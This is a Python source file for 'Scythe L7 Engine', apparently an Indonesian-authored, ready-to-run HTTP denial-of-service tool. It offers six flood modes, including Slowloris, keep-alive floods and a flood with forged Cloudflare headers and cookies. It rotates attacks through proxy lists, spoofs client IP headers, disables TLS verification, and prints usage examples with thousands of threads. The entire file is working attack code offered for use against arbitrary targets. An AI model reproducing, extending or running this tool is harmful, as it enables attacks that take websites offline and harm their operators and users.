#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  SCYTHE L7 ENGINE v12.0 — 6 METHODS TERBAIK + PROXY FIX + RETRY            ║
║  🔥 httpbypass, cf-flood, slow, httpget, httpflood, auto                   ║
║  🔥 PROXY: support user:pass@host:port, timeout 10s, retry 2x             ║
║  🔥 DIRECT FALLBACK jika proxy = 0 atau semua mati                         ║
║  🔥 ERROR LOG: unlimited, biar tau penyebab gagal                          ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import sys
import os
import time
import json
import random
import string
import threading
import socket
import ssl
import urllib.parse
import hashlib
import base64

# ─── Cari proxies.txt di berbagai lokasi ───
def find_proxy_file(filename="proxies.txt"):
    paths = [
        filename,
        os.path.join(os.path.dirname(__file__), filename),
        os.path.join(os.path.dirname(os.path.dirname(__file__)), filename),
        "/root/ddosxscythe/" + filename,
    ]
    for p in paths:
        if os.path.exists(p):
            return os.path.abspath(p)
    return None

# ─── Proxy Manager ───
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = []
        self.lock = threading.Lock()
        self._load()

    def _load(self):
        if not self.proxy_file or not os.path.exists(self.proxy_file):
            print("[PROXY] No proxy file, using DIRECT connection only", flush=True)
            return
        try:
            with open(self.proxy_file, "r") as f:
                self.proxies = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
            print(f"[PROXY] Loaded {len(self.proxies)} proxies", flush=True)
        except Exception as e:
            print(f"[PROXY ERROR] {e}", flush=True)

    def get(self):
        with self.lock:
            return random.choice(self.proxies) if self.proxies else None

    def count(self):
        with self.lock:
            return len(self.proxies)

# ─── L7 Engine ───
class L7AttackEngine:
    def __init__(self, target, duration, threads, proxy_file=None, method_type="httpbypass"):
        self.target = target
        self.duration = int(duration)
        self.threads = int(threads)
        self.method_type = method_type.lower()
        self.proxy_mgr = ProxyManager(proxy_file)
        self.running = False
        self.total_requests = 0
        self.total_bytes = 0
        self.counter_lock = threading.Lock()
        self.start_time = 0
        self.end_time = 0
        self.error_count = 0
        self.error_lock = threading.Lock()
        self._parse_target()

    def _parse_target(self):
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        parsed = urllib.parse.urlparse(self.target)
        self.scheme = parsed.scheme or 'https'
        self.host = parsed.netloc or parsed.path
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        if ':' in self.host:
            self.host = self.host.split(':')[0]

    def _ssl_ctx(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        return ctx

    def _headers(self, extra=None):
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        ])
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'fr-FR,fr;q=0.9']),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() > 0.5:
            headers['Referer'] = f"https://{self.host}/"
        if extra:
            headers.update(extra)
        return headers

    def _path(self):
        paths = ['/', '/index.html', '/api', '/home', '/login', '/register', '/wp-admin',
                 '/admin', '/assets/', '/favicon.ico', '/sitemap.xml', '/robots.txt',
                 '/api/v1/users', '/api/v1/orders', '/graphql', '/search', '/category']
        path = random.choice(paths)
        if random.random() > 0.3:
            path += f"?cb={random.randint(100000,999999)}&t={int(time.time())}"
        return path

    def _log_error(self, msg):
        with self.error_lock:
            self.error_count += 1
            print(f"[ERROR] {msg}", flush=True)

    # ─── CORE SEND REQUEST (dengan retry internal) ───
    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2):
        for attempt in range(retries):
            sock = None
            try:
                path = path or self._path()
                if proxy:
                    # Parse proxy: [user:pass@]host:port
                    proxy_str = proxy
                    if '://' in proxy_str:
                        proxy_str = proxy_str.split('://')[-1]
                    user_pass = None
                    if '@' in proxy_str:
                        user_pass, proxy_str = proxy_str.split('@', 1)
                    p_host, p_port = proxy_str.split(':')
                    p_port = int(p_port)

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((p_host, p_port))

                    if self.scheme == 'https':
                        connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                        if user_pass:
                            auth = base64.b64encode(user_pass.encode()).decode()
                            connect += f"Proxy-Authorization: Basic {auth}\r\n"
                        connect += "\r\n"
                        sock.sendall(connect.encode())
                        resp = sock.recv(1024)
                        if b'200' not in resp:
                            sock.close()
                            continue  # retry
                        sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.host, self.port))
                    if self.scheme == 'https':
                        sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)

                headers = self._headers(extra_headers)
                req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                for k, v in headers.items():
                    req += f"{k}: {v}\r\n"
                if body:
                    req += f"Content-Length: {len(body)}\r\n"
                req += "\r\n"
                if body:
                    req += body

                sock.sendall(req.encode())
                # Baca response (tidak wajib, hanya untuk menambah realisme)
                try:
                    data = sock.recv(4096)
                    sock.close()
                    return True, len(data)
                except:
                    sock.close()
                    return True, 0

            except Exception as e:
                if sock:
                    try: sock.close()
                    except: pass
                self._log_error(f"_send_request (attempt {attempt+1}): {e}")
                continue  # retry
        return False, 0

    # ─── WORKER UNTUK MASING-MASING METODE ───
    def _httpbypass_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_mgr.get()
                extra = {
                    'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
                    'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
                    'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
                }
                if random.random() > 0.5:
                    extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
                    extra['Sec-Ch-Ua-Mobile'] = '?0'
                    extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
            except Exception as e:
                self._log_error(f"httpbypass: {e}")
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _cfflood_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_mgr.get()
                extra = {
                    'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                    'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'CF-IPCountry': random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL']),
                    'CF-Visitor': '{"scheme": "https"}',
                    'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
                    'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
                }
                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
            except Exception as e:
                self._log_error(f"cfflood: {e}")
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _slow_worker(self):
        # Slowloris: buka koneksi dan kirim header parsial secara periodik
        end_time = self.end_time
        local_count = 0
        connections = []
        while self.running and time.time() < end_time:
            try:
                # Buka koneksi baru sampai batas
                while len(connections) < 100 and self.running and time.time() < end_time:
                    proxy = self.proxy_mgr.get()
                    sock = None
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        if proxy:
                            p_host, p_port = proxy.split(':')
                            sock.connect((p_host, int(p_port)))
                            if self.scheme == 'https':
                                connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n\r\n"
                                sock.sendall(connect.encode())
                                sock.recv(1024)
                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
                        else:
                            sock.connect((self.host, self.port))
                            if self.scheme == 'https':
                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
                        # Kirim request awal (tanpa header selesai)
                        sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                        connections.append({'sock': sock, 'last': time.time()})
                        local_count += 1
                    except Exception as e:
                        if sock:
                            try: sock.close()
                            except: pass
                        self._log_error(f"slow connect: {e}")

                # Jaga koneksi tetap hidup dengan mengirim header acak
                for conn in connections[:]:
                    if time.time() - conn['last'] > random.randint(8, 15):
                        try:
                            header = ''.join(random.choices(string.ascii_letters, k=random.randint(5,15)))
                            value = random._urandom(random.randint(10,100)).hex()
                            conn['sock'].sendall(f"{header}: {value}\r\n".encode())
                            conn['last'] = time.time()
                        except:
                            try: conn['sock'].close()
                            except: pass
                            connections.remove(conn)
                time.sleep(0.5)
            except Exception as e:
                self._log_error(f"slow outer: {e}")
        # Bersihkan koneksi saat selesai
        for conn in connections:
            try: conn['sock'].close()
            except: pass
        with self.counter_lock:
            self.total_requests += local_count

    def _httpget_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_mgr.get()
                path = self._path()
                success, bytes_recv = self._send_request(proxy=proxy, path=path)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
            except Exception as e:
                self._log_error(f"httpget: {e}")
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _httpflood_worker(self):
        # Keep-alive: buka koneksi dan kirim banyak request per koneksi
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        connections = []
        max_conns = 50
        while self.running and time.time() < end_time:
            try:
                # Buka koneksi baru jika kurang
                while len(connections) < max_conns and self.running:
                    proxy = self.proxy_mgr.get()
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        if proxy:
                            p_host, p_port = proxy.split(':')
                            sock.connect((p_host, int(p_port)))
                            if self.scheme == 'https':
                                connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n\r\n"
                                sock.sendall(connect.encode())
                                sock.recv(1024)
                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
                        else:
                            sock.connect((self.host, self.port))
                            if self.scheme == 'https':
                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
                        # Kirim request pertama
                        req = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nConnection: keep-alive\r\n\r\n"
                        sock.sendall(req.encode())
                        connections.append({'sock': sock, 'requests': 1})
                        local_count += 1
                    except Exception as e:
                        self._log_error(f"httpflood connect: {e}")

                # Kirim request tambahan pada koneksi yang sudah ada
                for conn in connections[:]:
                    try:
                        if conn['requests'] < 100:  # batas request per koneksi
                            headers = self._headers()
                            path = self._path()
                            req = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                            for k, v in headers.items():
                                req += f"{k}: {v}\r\n"
                            req += "Connection: keep-alive\r\n\r\n"
                            conn['sock'].sendall(req.encode())
                            conn['requests'] += 1
                            local_count += 1
                        else:
                            conn['sock'].close()
                            connections.remove(conn)
                    except:
                        try: conn['sock'].close()
                        except: pass
                        connections.remove(conn)
                time.sleep(0.01)
            except Exception as e:
                self._log_error(f"httpflood outer: {e}")

        for conn in connections:
            try: conn['sock'].close()
            except: pass
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _auto_worker(self):
        # Auto switch antara metode setiap 30 detik
        end_time = self.end_time
        local_count = 0
        workers = [self._httpbypass_worker, self._cfflood_worker,
                   self._httpget_worker, self._httpflood_worker]
        worker_idx = 0
        last_switch = time.time()
        switch_interval = 30
        while self.running and time.time() < end_time:
            try:
                if time.time() - last_switch > switch_interval:
                    worker_idx = (worker_idx + 1) % len(workers)
                    last_switch = time.time()
                # Panggil worker yang aktif
                workers[worker_idx]()
            except Exception as e:
                self._log_error(f"auto: {e}")
        with self.counter_lock:
            self.total_requests += local_count

    # ─── RPS REPORTER ───
    def _rps_reporter(self):
        last_total = 0
        last_time = time.time()
        while self.running:
            time.sleep(1)
            with self.counter_lock:
                current_total = self.total_requests
            elapsed = time.time() - last_time
            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
            print(f"RPS: {rps} | Total: {current_total} | Proxy: {self.proxy_mgr.count()}", flush=True)
            sys.stdout.flush()
            last_total = current_total
            last_time = time.time()

    # ─── START ───
    def start(self):
        self.running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        proxy_count = self.proxy_mgr.count()

        print(f"\n[Scythe L7 v12.0] {self.method_type.upper()} attack launched", flush=True)
        print(f"🎯 Target: {self.target}", flush=True)
        print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        # Reporter
        reporter = threading.Thread(target=self._rps_reporter, daemon=True)
        reporter.start()

        # Pilih worker
        worker_map = {
            'httpbypass': self._httpbypass_worker,
            'cf-flood': self._cfflood_worker,
            'slow': self._slow_worker,
            'httpget': self._httpget_worker,
            'httpflood': self._httpflood_worker,
            'auto': self._auto_worker,
        }
        worker_func = worker_map.get(self.method_type, self._httpbypass_worker)

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            threads.append(t)

        # Tunggu durasi
        time.sleep(self.duration)
        self.running = False

        for t in threads:
            t.join(timeout=2)

        with self.counter_lock:
            final_total = self.total_requests
            final_bytes = self.total_bytes

        elapsed = time.time() - self.start_time
        avg_rps = int(final_total / elapsed) if elapsed > 0 else 0

        print(f"\n[Scythe L7] Attack completed!", flush=True)
        print(f"📊 Total Requests: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
        print(f"⚠️  Total Errors: {self.error_count}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        return final_total, avg_rps, final_bytes

# ─── STANDALONE ───
if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("\n" + "="*60)
        print("🔥 SCYTHE L7 ENGINE v12.0 — 6 METHODS TERBAIK")
        print("="*60)
        print("\nUsage:")
        print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
        print("\n6 Methods:")
        for m in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
            print(f"  - {m}")
        print("\nExamples:")
        print("  python3 l7_engine.py httpbypass example.com 60 500")
        print("  python3 l7_engine.py cf-flood example.com 120 1000")
        print("  python3 l7_engine.py auto example.com 300 2000")
        print("="*60)
        sys.exit(1)

    args = [a for a in sys.argv[1:] if a != '--debug']
    method = args[0].lower()
    target = args[1]
    duration = args[2]
    threads = args[3] if len(args) > 3 else '100'
    proxy_file = args[4] if len(args) > 4 else find_proxy_file()

    engine = L7AttackEngine(target, duration, threads, proxy_file, method)
    engine.start()